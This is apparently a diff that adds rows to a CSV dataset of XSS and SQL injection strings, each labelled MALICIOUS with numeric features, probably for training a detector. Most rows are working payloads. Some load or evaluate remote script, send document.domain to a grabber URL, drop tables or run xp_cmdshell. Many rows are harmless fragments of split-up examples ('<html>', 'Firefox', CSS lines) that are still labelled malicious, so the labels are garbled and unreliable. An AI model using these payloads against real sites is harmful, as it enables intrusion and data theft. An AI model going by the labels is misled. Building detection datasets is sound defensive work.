+<script>\\u0061lert('22')</script>,STRING,MALICIOUS,LOW,4.2108,0.0,0,0,1,0.3,0,0,0,0,0.1818,0.0,0.303,xss
+<script>eval('\\x61lert(\\'33\\')')</script>,STRING,MALICIOUS,LOW,4.2779,0.0,0,0,1,0.5,1,0,0,1,0.0976,0.0,0.3902,xss
+"<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(""confirm"",30) == 8680439 && 8680439..toString(30) == ""confirm""",STRING,MALICIOUS,LOW,4.8746,0.0,0,0,1,0.8,1,0,1,1,0.25,0.0286,0.3071,xss
+"<object/data=""jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;"">",STRING,MALICIOUS,LOW,4.5346,0.0,0,0,1,0.5,1,0,1,0,0.197,0.0,0.3636,xss
+<img src=x onerror=alert('XSS');>,STRING,MALICIOUS,LOW,4.329,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0909,0.3333,xss
+<img src=x onerror=alert('XSS')//,STRING,MALICIOUS,LOW,4.2683,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0909,0.3333,xss
+"<img src=x onerror=alert(String.fromCharCode(88,83,83));>",STRING,MALICIOUS,LOW,4.5916,0.0,0,0,1,0.65,1,1,1,0,0.1053,0.0526,0.2456,xss
+"<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",STRING,MALICIOUS,LOW,4.4638,0.0,0,0,1,0.65,1,1,1,0,0.0938,0.0469,0.2188,xss
+<img src=x:alert(alt) onerror=eval(src) alt=xss>,STRING,MALICIOUS,LOW,4.1573,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.2708,xss
+"""><img src=x onerror=alert('XSS');>",STRING,MALICIOUS,LOW,4.3976,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0857,0.3714,xss
+"""><img src=x onerror=alert(String.fromCharCode(88,83,83));>",STRING,MALICIOUS,LOW,4.6495,0.0,0,0,1,0.65,1,1,1,0,0.1017,0.0508,0.2712,xss
+<><img src=1 onerror=alert(1)>,STRING,MALICIOUS,LOW,4.0532,0.0,0,0,1,0.3,0,0,0,0,0.0667,0.0,0.3333,xss
+<svg\x0conload=alert(1)>,STRING,MALICIOUS,HIGH,4.1066,0.0,0,0,1,0.3,0,0,0,0,0.0476,0.0,0.2857,xss
+<svg/onload=alert('XSS')>,STRING,MALICIOUS,LOW,4.2439,0.0,0,0,1,0.3,0,0,0,0,0.0,0.12,0.32,xss
+<svg onload=alert(1)//,STRING,MALICIOUS,LOW,4.0958,0.0,0,0,1,0.3,0,0,0,0,0.0455,0.0,0.3182,xss
+"<svg/onload=alert(String.fromCharCode(88,83,83))>",STRING,MALICIOUS,LOW,4.5789,0.0,0,0,1,0.35,0,1,0,0,0.1224,0.0612,0.2245,xss
+<svg id=alert(1) onload=eval(id)>,STRING,MALICIOUS,LOW,4.1273,0.0,0,0,1,0.5,1,0,0,1,0.0303,0.0,0.303,xss
+"""><svg/onload=alert(String.fromCharCode(88,83,83))>",STRING,MALICIOUS,LOW,4.638,0.0,0,0,1,0.35,0,1,0,0,0.1176,0.0588,0.2549,xss
+"""><svg/onload=alert(/XSS/)",STRING,MALICIOUS,LOW,4.2099,0.0,0,0,1,0.3,0,0,0,0,0.0,0.1154,0.3462,xss
+"<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",STRING,MALICIOUS,LOW,4.5994,0.0,0,0,1,0.3,0,0,0,0,0.0101,0.0101,0.2525,xss
+<svg><script>alert('33'),STRING,MALICIOUS,LOW,4.0016,0.0,0,0,1,0.3,0,0,0,0,0.0833,0.0,0.3333,xss
+<svg><script>alert&lpar;'33'&rpar;,STRING,MALICIOUS,LOW,3.9369,0.0,0,0,1,0.5,1,0,1,0,0.0588,0.0,0.2941,xss
+"<div onpointerover=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.599,0.0,0,0,1,0.3,0,0,0,0,0.0435,0.1739,0.2609,xss
+"<div onpointerdown=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.6589,0.0,0,0,1,0.3,0,0,0,0,0.0435,0.1739,0.2609,xss
+"<div onpointerenter=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.5807,0.0,0,0,1,0.3,0,0,0,0,0.0426,0.1702,0.2553,xss
+"<div onpointerleave=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.6128,0.0,0,0,1,0.3,0,0,0,0,0.0426,0.1702,0.2553,xss
+"<div onpointermove=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.6589,0.0,0,0,1,0.3,0,0,0,0,0.0435,0.1739,0.2609,xss
+"<div onpointerout=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.6692,0.0,0,0,1,0.3,0,0,0,0,0.0444,0.1778,0.2667,xss
+"<div onpointerup=""alert(45)"">MOVE HERE</div>",STRING,MALICIOUS,LOW,4.6978,0.0,0,0,1,0.3,0,0,0,0,0.0455,0.1818,0.2727,xss
+<body onload=alert(/XSS/.source)>,STRING,MALICIOUS,LOW,4.3777,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0909,0.2727,xss
+<input autofocus onfocus=alert(1)>,STRING,MALICIOUS,LOW,4.1241,0.0,0,0,1,0.3,0,0,0,0,0.0294,0.0,0.2059,xss
+<select autofocus onfocus=alert(1)>,STRING,MALICIOUS,LOW,3.9929,0.0,0,0,1,0.35,0,1,0,0,0.0286,0.0,0.2,xss
+<textarea autofocus onfocus=alert(1)>,STRING,MALICIOUS,LOW,4.0335,0.0,0,0,1,0.3,0,0,0,0,0.027,0.0,0.1892,xss
+<keygen autofocus onfocus=alert(1)>,STRING,MALICIOUS,LOW,4.229,0.0,0,0,1,0.3,0,0,0,0,0.0286,0.0,0.2,xss
+<video/poster/onerror=alert(1)>,STRING,MALICIOUS,LOW,3.9345,0.0,0,0,1,0.3,0,0,0,0,0.0323,0.0,0.2258,xss
+"<video><source onerror=""javascript:alert(1)"">",STRING,MALICIOUS,LOW,4.3304,0.0,0,0,1,0.3,0,0,0,0,0.0222,0.0,0.2444,xss
+"<video src=_ onloadstart=""alert(1)"">",STRING,MALICIOUS,LOW,4.2527,0.0,0,0,1,0.3,0,0,0,0,0.0278,0.0,0.3056,xss
+"<details/open/ontoggle=""alert`1`"">",STRING,MALICIOUS,LOW,4.0797,0.0,0,0,1,0.3,0,0,0,0,0.0294,0.0,0.2647,xss
+<audio src onloadstart=alert(1)>,STRING,MALICIOUS,LOW,4.0542,0.0,0,0,1,0.3,0,0,0,0,0.0312,0.0,0.2188,xss
+<marquee onstart=alert(1)>,STRING,MALICIOUS,LOW,3.9689,0.0,0,0,1,0.3,0,0,0,0,0.0385,0.0,0.2308,xss
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>,STRING,MALICIOUS,LOW,4.295,0.0,0,0,1,0.3,0,0,0,0,0.1176,0.0,0.2647,xss
+<body ontouchstart=alert(1)> // Triggers when a finger touch the screen,STRING,MALICIOUS,LOW,4.3438,0.0,0,0,1,0.3,0,0,0,0,0.0141,0.0141,0.2254,xss
+<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen,STRING,MALICIOUS,LOW,4.3667,0.0,0,0,1,0.35,0,1,0,0,0.012,0.012,0.241,xss
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.,STRING,MALICIOUS,LOW,4.4015,0.0,0,0,1,0.3,0,0,0,0,0.0133,0.0133,0.2533,xss
+"<svg/onload='fetch(""//host/a"").then(r=>r.text().then(t=>eval(t)))'>",STRING,MALICIOUS,LOW,4.3443,0.0,0,0,1,0.5,1,0,0,1,0.0,0.0,0.4179,xss
+<script src=14.rs>,STRING,MALICIOUS,LOW,3.5305,0.0,0,0,1,0.3,0,0,0,0,0.1111,0.0,0.2778,xss
+e.g: 14.rs/#alert(document.domain),STRING,MALICIOUS,LOW,4.396,0.0,0,0,1,0.3,0,0,0,0,0.0588,0.0,0.2647,xss
+"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)"">",STRING,MALICIOUS,LOW,4.405,0.0,0,0,1,0.3,0,0,0,0,0.0185,0.0185,0.2963,xss
+Use CTRL+SHIFT+X to trigger the onclick event,STRING,MALICIOUS,LOW,4.3559,0.0,0,0,1,0.3,0,0,0,0,0.0,0.2444,0.1778,xss
+"<input type=""hidden"" oncontentvisibilityautostatechange=""alert(1)""  style=""content-visibility:auto"" >",STRING,MALICIOUS,LOW,4.35,0.0,0,0,1,0.3,0,0,0,0,0.0099,0.0,0.198,xss
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>,STRING,MALICIOUS,LOW,4.3327,0.0,0,0,1,0.5,1,0,1,0,0.2075,0.3585,0.434,xss
+-(confirm)(document.domain)//,STRING,MALICIOUS,LOW,3.9523,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2759,xss
+; alert(1);//,STRING,MALICIOUS,LOW,3.3927,0.0,0,0,1,0.3,0,0,1,0,0.0769,0.0,0.5385,xss
+javascript:prompt(1),STRING,MALICIOUS,LOW,3.7842,0.0,0,0,1,0.3,0,0,0,0,0.05,0.0,0.15,xss
+&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41,STRING,MALICIOUS,LOW,2.8908,0.0,0,0,0,0.1,0,0,0,0,0.567,0.0,0.433,xss
+"We can encode the ""javascript:"" in Hex/Octal",STRING,MALICIOUS,LOW,4.1724,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0682,0.2273,xss
+\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1),STRING,MALICIOUS,LOW,3.494,0.0,0,0,1,0.1,0,0,0,0,0.4038,0.0192,0.25,xss
+\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1),STRING,MALICIOUS,LOW,3.253,0.0,0,0,1,0.1,0,0,0,0,0.5811,0.0135,0.1757,xss
+\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1),STRING,MALICIOUS,LOW,3.2846,0.0,0,0,1,0.1,0,0,0,0,0.6538,0.0,0.25,xss
+We can use a 'newline character',STRING,MALICIOUS,LOW,3.6022,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0312,0.2188,xss
+java%0ascript:alert(1)   - LF (\\n),STRING,MALICIOUS,LOW,4.2754,0.0,0,0,1,0.3,0,0,0,0,0.0588,0.0588,0.3824,xss
+java%09script:alert(1)   - Horizontal tab (\\t),STRING,MALICIOUS,LOW,4.3609,0.0,0,0,1,0.3,0,0,0,0,0.0652,0.0217,0.3043,xss
+java%0dscript:alert(1)   - CR (\\r),STRING,MALICIOUS,LOW,4.2898,0.0,0,0,1,0.3,0,0,0,0,0.0588,0.0588,0.3824,xss
+Using the escape character,STRING,MALICIOUS,LOW,3.5364,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0385,0.1154,xss
+\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\),STRING,MALICIOUS,LOW,3.2231,0.0,0,0,1,0.1,0,0,0,0,0.0312,0.0,0.5,xss
+Using the newline and a comment //,STRING,MALICIOUS,LOW,3.7604,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0294,0.2353,xss
+javascript://%0Aalert(1),STRING,MALICIOUS,LOW,4.1368,0.0,0,0,1,0.3,0,0,0,0,0.0833,0.0417,0.25,xss
+javascript://anything%0D%0A%0D%0Awindow.alert(1),STRING,MALICIOUS,LOW,4.5794,0.0,0,0,1,0.3,0,0,0,0,0.1042,0.0833,0.2083,xss
+"data:text/html,<script>alert(0)</script>",STRING,MALICIOUS,LOW,4.1429,0.0,0,0,1,0.3,0,0,0,0,0.025,0.0,0.25,xss
+"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",STRING,MALICIOUS,LOW,4.9337,0.0,0,0,1,0.5,1,0,1,0,0.1,0.22,0.1,xss
+"<script src=""data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==""></script>",STRING,MALICIOUS,LOW,4.9704,0.0,0,0,1,0.5,1,0,1,0,0.0725,0.1884,0.2029,xss
+"vbscript:msgbox(""XSS"")",STRING,MALICIOUS,LOW,4.0958,0.0,0,0,1,0.3,0,0,0,0,0.0,0.1364,0.2273,xss
+<name>,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,xss
+<value><![CDATA[<script>confirm(document.domain)</script>]]></value>,STRING,MALICIOUS,LOW,4.6866,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0735,0.2941,xss
+</name>,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,xss
+<html>,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,xss
+<head></head>,STRING,MALICIOUS,LOW,2.7774,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3846,xss
+<body>,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,xss
+"<something:script xmlns:something=""http://www.w3.org/1999/xhtml"">alert(1)</something:script>",STRING,MALICIOUS,LOW,4.6242,0.0,0,0,1,0.3,0,0,0,0,0.0652,0.0,0.2283,xss
+</body>,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,xss
+</html>,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,xss
+"<?xml version=""1.0"" standalone=""no""?>",STRING,MALICIOUS,LOW,4.2701,0.0,0,0,1,0.3,0,0,0,0,0.0541,0.0,0.3514,xss
+"<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">",STRING,MALICIOUS,LOW,4.9119,0.0,0,0,1,0.3,0,0,0,0,0.0816,0.3061,0.3367,xss
+"<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">",STRING,MALICIOUS,LOW,4.7664,0.0,0,0,1,0.3,0,0,0,0,0.0959,0.0137,0.3014,xss
+"<polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>",STRING,MALICIOUS,LOW,4.3155,0.0,0,0,1,0.3,0,0,0,0,0.2532,0.0,0.3291,xss
+"<script type=""text/javascript"">",STRING,MALICIOUS,LOW,3.9747,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2258,xss
+alert(document.domain);,STRING,MALICIOUS,LOW,3.9149,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.1739,xss
+</svg>,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,xss
+"<svg version=""1.1"" baseProfile=""full"" width=""100"" height=""100"" xmlns=""http://www.w3.org/2000/svg"" onload=""alert('svg attribut')"">",STRING,MALICIOUS,LOW,4.825,0.0,0,0,1,0.3,0,0,0,0,0.1008,0.0078,0.3023,xss
+"<polygon id=""lightning"" points=""0,100 50,25 50,75 100,0"" fill=""#ff1919"" stroke=""#ff0000""/>",STRING,MALICIOUS,LOW,4.4541,0.0,0,0,1,0.3,0,0,0,0,0.2667,0.0,0.3111,xss
+<desc><script>alert('svg desc')</script></desc>,STRING,MALICIOUS,LOW,3.9932,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3191,xss
+<foreignObject><script>alert('svg foreignObject')</script></foreignObject>,STRING,MALICIOUS,LOW,4.3557,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0405,0.2027,xss
+"<foreignObject width=""500"" height=""500"">",STRING,MALICIOUS,LOW,4.2464,0.0,0,0,1,0.3,0,0,0,0,0.15,0.025,0.25,xss
+"<iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert('svg foreignObject iframe');"" width=""400"" height=""250""/>",STRING,MALICIOUS,LOW,5.0369,0.0,0,0,1,0.5,1,0,1,0,0.0894,0.0081,0.2764,xss
+</foreignObject>,STRING,MALICIOUS,LOW,3.875,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0625,0.1875,xss
+<title><script>alert('svg title')</script></title>,STRING,MALICIOUS,LOW,3.8509,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3,xss
+"<animatetransform onbegin=""alert('svg animatetransform onbegin')""></animatetransform>",STRING,MALICIOUS,LOW,4.1477,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.1765,xss
+alert('svg script');,STRING,MALICIOUS,LOW,3.9219,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.3,xss
+"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",STRING,MALICIOUS,LOW,4.7753,0.0,0,0,1,0.3,0,0,0,0,0.0685,0.0,0.2877,xss
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,STRING,MALICIOUS,LOW,4.3269,0.0,0,0,1,0.3,0,0,0,0,0.0164,0.082,0.3934,xss
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>,STRING,MALICIOUS,LOW,4.6217,0.0,0,0,1,0.3,0,0,0,0,0.0127,0.0886,0.3038,xss
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>,STRING,MALICIOUS,LOW,4.2634,0.0,0,0,1,0.3,0,0,0,0,0.0159,0.0794,0.381,xss
+"<svg width=""200"" height=""200"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",STRING,MALICIOUS,LOW,4.6514,0.0,0,0,1,0.3,0,0,0,0,0.1481,0.0,0.3056,xss
+"<image xlink:href=""http://127.0.0.1:9999/red_lightning_xss_full.svg"" height=""200"" width=""200""/>",STRING,MALICIOUS,LOW,4.7957,0.0,0,0,1,0.3,0,0,0,0,0.1684,0.0,0.2947,xss
+"<use xlink:href=""http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning""/>",STRING,MALICIOUS,LOW,4.7123,0.0,0,0,1,0.3,0,0,0,0,0.1282,0.0,0.2692,xss
+"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",STRING,MALICIOUS,LOW,4.5887,0.0,0,0,1,0.3,0,0,0,0,0.1205,0.0,0.3012,xss
+"<svg x=""10"">",STRING,MALICIOUS,LOW,3.4183,0.0,0,0,1,0.1,0,0,0,0,0.1667,0.0,0.5,xss
+"<rect x=""10"" y=""10"" height=""100"" width=""100"" style=""fill: #002654""/>",STRING,MALICIOUS,LOW,4.3028,0.0,0,0,1,0.3,0,0,0,0,0.2353,0.0,0.3824,xss
+"<script type=""text/javascript"">alert('sub-svg 1');</script>",STRING,MALICIOUS,LOW,4.522,0.0,0,0,1,0.5,1,0,1,0,0.0169,0.0,0.2881,xss
+"<svg x=""200"">",STRING,MALICIOUS,LOW,3.3927,0.0,0,0,1,0.1,0,0,0,0,0.2308,0.0,0.4615,xss
+"<rect x=""10"" y=""10"" height=""100"" width=""100"" style=""fill: #ED2939""/>",STRING,MALICIOUS,LOW,4.3982,0.0,0,0,1,0.3,0,0,0,0,0.2059,0.0294,0.3824,xss
+"<script type=""text/javascript"">alert('sub-svg 2');</script>",STRING,MALICIOUS,LOW,4.522,0.0,0,0,1,0.5,1,0,1,0,0.0169,0.0,0.2881,xss
+[a](javascript:prompt(document.cookie)),STRING,MALICIOUS,LOW,4.2849,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2051,xss
+[a](j a v a s c r i p t:prompt(document.cookie)),STRING,MALICIOUS,LOW,4.1777,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3542,xss
+"[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",STRING,MALICIOUS,LOW,5.2263,0.0,0,0,1,0.5,1,0,1,0,0.0896,0.2388,0.1194,xss
+[a](javascript:window.onerror=alert;throw%201),STRING,MALICIOUS,LOW,4.5014,0.0,0,0,1,0.5,1,0,1,0,0.0652,0.0,0.1957,xss
+<!DOCTYPE html>,STRING,MALICIOUS,LOW,3.9069,0.0,0,0,1,0.3,0,0,0,0,0.0,0.4667,0.2667,xss
+<head>,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,xss
+<style>,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2857,xss
+div  {,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,xss
+"background-image: url(""data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>"");",STRING,MALICIOUS,LOW,4.8644,0.0,0,0,1,0.5,1,0,1,0,0.0217,0.0,0.25,xss
+background-color: #cccccc;,STRING,MALICIOUS,LOW,3.5176,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.1923,xss
+</style>,STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.375,xss
+</head>,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,xss
+<div>lol</div>,STRING,MALICIOUS,LOW,2.9502,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3571,xss
+"<input type=button value=""Click Me"" id=""btn"">",STRING,MALICIOUS,LOW,4.2167,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0444,0.2889,xss
+document.getElementById('btn').onclick = function(e){,STRING,MALICIOUS,LOW,4.3792,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0566,0.2264,xss
+window.poc = window.open('http://www.redacted.com/#login');,STRING,MALICIOUS,LOW,4.3286,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.2881,xss
+setTimeout(function(){,STRING,MALICIOUS,LOW,3.6978,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0455,0.1818,xss
+window.poc.postMessage(,STRING,MALICIOUS,LOW,3.7623,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0435,0.1304,xss
+"""sender"": ""accounts"",",STRING,MALICIOUS,LOW,3.6304,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3333,xss
+"""url"": ""javascript:confirm('XSS')"",",STRING,MALICIOUS,LOW,4.422,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0857,0.3429,xss
+'*',STRING,MALICIOUS,LOW,0.9183,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,xss
+"}, 2000);",STRING,MALICIOUS,LOW,2.6416,0.0,0,0,0,0.3,0,0,1,0,0.4444,0.0,0.5556,xss
+"""><script src=""https://js.rip/<custom.name>""></script>",STRING,MALICIOUS,LOW,4.1737,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3519,xss
+"""><script src=//<custom.subdomain>.xss.ht></script>",STRING,MALICIOUS,LOW,4.1935,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3137,xss
+"<script>$.getScript(""//<custom.subdomain>.xss.ht"")</script>",STRING,MALICIOUS,LOW,4.4116,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0169,0.3051,xss
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>,STRING,MALICIOUS,LOW,4.8132,0.0,0,0,1,0.3,0,0,0,0,0.1263,0.0316,0.2421,xss
+ruby -run -ehttpd . -p8080,STRING,MALICIOUS,LOW,3.7483,0.0,0,0,1,0.3,0,0,0,0,0.1538,0.0,0.3077,xss
+"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",STRING,MALICIOUS,LOW,4.2825,0.0,0,0,1,0.3,0,0,0,0,0.0164,0.0,0.3115,xss
+alert(document.domain),STRING,MALICIOUS,LOW,3.8231,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.1364,xss
+alert(window.origin),STRING,MALICIOUS,LOW,3.6842,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.15,xss
+alert(1),STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.1,0,0,0,0,0.125,0.0,0.25,xss
+<script>alert(1)</script>,STRING,MALICIOUS,LOW,3.7835,0.0,0,0,1,0.3,0,0,0,0,0.04,0.0,0.28,xss
+alert(),STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2857,xss
+console.log(),STRING,MALICIOUS,LOW,3.1808,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2308,xss
+Firefox,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.1429,0.0,xss
+style,STRING,MALICIOUS,LOW,2.3219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,xss
+' OR '1'='1,STRING,MALICIOUS,LOW,2.3685,0.0,0,0,1,0.1,0,0,0,0,0.1818,0.1818,0.6364,sql_injection
+' OR '1'='1' --,STRING,MALICIOUS,LOW,2.5493,0.0,0,0,1,0.1,0,0,0,0,0.1333,0.1333,0.7333,sql_injection
+' OR 1=1--,STRING,MALICIOUS,LOW,2.7219,0.0,0,0,1,0.1,0,0,0,0,0.2,0.2,0.6,sql_injection
+admin'--,STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.375,sql_injection
+1' ORDER BY 1--,STRING,MALICIOUS,LOW,3.1899,0.0,0,0,1,0.1,0,0,0,0,0.1333,0.4667,0.4,sql_injection
+1' ORDER BY 2--,STRING,MALICIOUS,LOW,3.3232,0.0,0,0,1,0.1,0,0,0,0,0.1333,0.4667,0.4,sql_injection
+1 UNION SELECT NULL--,STRING,MALICIOUS,LOW,3.4273,0.0,0,0,1,0.15,0,1,0,0,0.0476,0.7143,0.2381,sql_injection
+"1 UNION SELECT NULL,NULL--",STRING,MALICIOUS,LOW,3.4266,0.0,0,0,1,0.15,0,1,0,0,0.0385,0.7308,0.2308,sql_injection
+"' UNION SELECT username,password FROM users--",STRING,MALICIOUS,LOW,4.4979,0.0,0,0,1,0.35,0,1,0,0,0.0,0.3333,0.2,sql_injection
+SELECT * FROM users WHERE id=1 OR 1=1,STRING,MALICIOUS,LOW,4.0429,0.0,0,0,1,0.35,0,1,0,0,0.0811,0.4595,0.2703,sql_injection
+1; DROP TABLE users--,STRING,MALICIOUS,LOW,3.9754,0.0,0,0,1,0.65,1,1,1,0,0.0476,0.4286,0.2857,sql_injection
+'; EXEC xp_cmdshell('dir')--,STRING,MALICIOUS,LOW,4.2804,0.0,0,0,1,0.8,1,0,1,1,0.0,0.1429,0.3929,sql_injection
+1' AND SLEEP(5)--,STRING,MALICIOUS,LOW,3.7345,0.0,0,0,1,0.3,0,0,0,0,0.1176,0.4706,0.4118,sql_injection
+1 WAITFOR DELAY '0:0:5'--,STRING,MALICIOUS,LOW,4.0537,0.0,0,0,1,0.3,0,0,0,0,0.16,0.48,0.36,sql_injection
+' HAVING 1=1--,STRING,MALICIOUS,LOW,3.3788,0.0,0,0,1,0.1,0,0,0,0,0.1429,0.4286,0.4286,sql_injection
+' GROUP BY 1--,STRING,MALICIOUS,LOW,3.3249,0.0,0,0,1,0.1,0,0,0,0,0.0714,0.5,0.4286,sql_injection
+SELECT table_name FROM information_schema.tables,STRING,MALICIOUS,LOW,4.4885,0.0,0,0,1,0.35,0,1,0,0,0.0,0.2083,0.125,sql_injection
+"INSERT INTO users VALUES ('admin','hacked')",STRING,MALICIOUS,LOW,4.6356,0.0,0,0,1,0.35,0,1,0,0,0.0,0.3721,0.2558,sql_injection
+UPDATE users SET password='hacked' WHERE 1=1,STRING,MALICIOUS,LOW,4.4683,0.0,0,0,1,0.35,0,1,0,0,0.0455,0.3182,0.2045,sql_injection
+DELETE FROM users WHERE 1=1,STRING,MALICIOUS,LOW,3.8064,0.0,0,0,1,0.35,0,1,0,0,0.0741,0.5556,0.1852,sql_injection
+"UNION ALL SELECT NULL,NULL,NULL--",STRING,MALICIOUS,LOW,3.2597,0.0,0,0,1,0.15,0,1,0,0,0.0,0.7879,0.2121,sql_injection
+"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",STRING,MALICIOUS,LOW,4.8581,0.0,0,0,1,0.35,0,1,0,0,0.0725,0.4638,0.2754,sql_injection
+SELECT * FROM users WHERE username='' OR 1=1--,STRING,MALICIOUS,LOW,4.308,0.0,0,0,1,0.35,0,1,0,0,0.0435,0.3696,0.3043,sql_injection
+' UNION SELECT table_name FROM information_schema.tables--,STRING,MALICIOUS,LOW,4.7289,0.0,0,0,1,0.35,0,1,0,0,0.0,0.2586,0.1897,sql_injection
+1' AND 1=1--,STRING,MALICIOUS,LOW,2.8554,0.0,0,0,1,0.1,0,0,0,0,0.25,0.25,0.5,sql_injection
+1' AND 1=2--,STRING,MALICIOUS,LOW,3.085,0.0,0,0,1,0.1,0,0,0,0,0.25,0.25,0.5,sql_injection
+SELECT password FROM users WHERE username='admin'--,STRING,MALICIOUS,LOW,4.5061,0.0,0,0,1,0.35,0,1,0,0,0.0,0.2941,0.1961,sql_injection
+"'; INSERT INTO users(username,password) VALUES('hacker','pass')--",STRING,MALICIOUS,LOW,4.7107,0.0,0,0,1,0.65,1,1,1,0,0.0,0.2462,0.2769,sql_injection
+1 OR 1=1,STRING,MALICIOUS,LOW,2.1556,0.0,0,0,1,0.1,0,0,0,0,0.375,0.25,0.375,sql_injection
